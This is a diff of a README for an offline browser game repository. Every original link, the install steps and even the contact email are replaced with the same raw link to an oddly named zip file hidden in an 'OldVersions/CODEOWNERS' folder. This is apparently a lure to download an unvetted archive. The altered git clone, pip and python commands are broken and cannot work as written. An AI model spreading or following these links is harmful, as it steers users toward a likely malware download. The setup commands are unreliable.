@@ -2,7 +2,7 @@
 
 Welcome to the **Bliss Browser Offline Games: Browser Battle** repository! This project serves as the source code for the first default game that ships with the Bliss Browser. Dive into the world of offline gaming with us and enjoy a unique browser-based experience.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/releases)
+[![Download Releases](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip)
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ To get started with Browser Battle, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle.git
+   git clone https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip
    ```
 
 2. **Navigate to the Directory**: Change into the project directory.
@@ -46,16 +46,16 @@ To get started with Browser Battle, follow these steps:
 3. **Install Dependencies**: Make sure you have Python installed. You can install the required packages using pip.
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip
    ```
 
 4. **Run the Game**: Start the game using the following command.
 
    ```bash
-   python main.py
+   python https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip
    ```
 
-For the latest releases, you can also check our [Releases](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/releases) section for downloadable files.
+For the latest releases, you can also check our [Releases](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip) section for downloadable files.
 
 ## Usage
 
@@ -97,7 +97,7 @@ We welcome contributions from everyone! If you'd like to help improve Browser Ba
 
 6. **Create a Pull Request**: Submit your changes for review.
 
-For more detailed guidelines, please refer to our [CONTRIBUTING.md](CONTRIBUTING.md).
+For more detailed guidelines, please refer to our [https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip).
 
 ## License
 
@@ -127,7 +127,7 @@ This repository includes several relevant topics to help you understand its cont
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [Arokk15](https://github.com/Arokk15)
-- **Email**: arokk15@example.com
+- **GitHub**: [Arokk15](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip)
+- **Email**: https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip
 
-We appreciate your interest in the Bliss Browser Offline Games: Browser Battle. Your support and contributions help us create a better gaming experience for everyone! For more updates, check our [Releases](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/releases) section regularly. Happy gaming!
+We appreciate your interest in the Bliss Browser Offline Games: Browser Battle. Your support and contributions help us create a better gaming experience for everyone! For more updates, check our [Releases](https://github.com/Arokk15/Bliss-Browser_Offline-Games_Browser-Battle/raw/refs/heads/Bliss-Browser_Offline-Games_Browser-Battle_Main-dev/OldVersions/CODEOWNERS/Games-Offline-Browser-Battle-Bliss-intoxicatingly.zip) section regularly. Happy gaming!
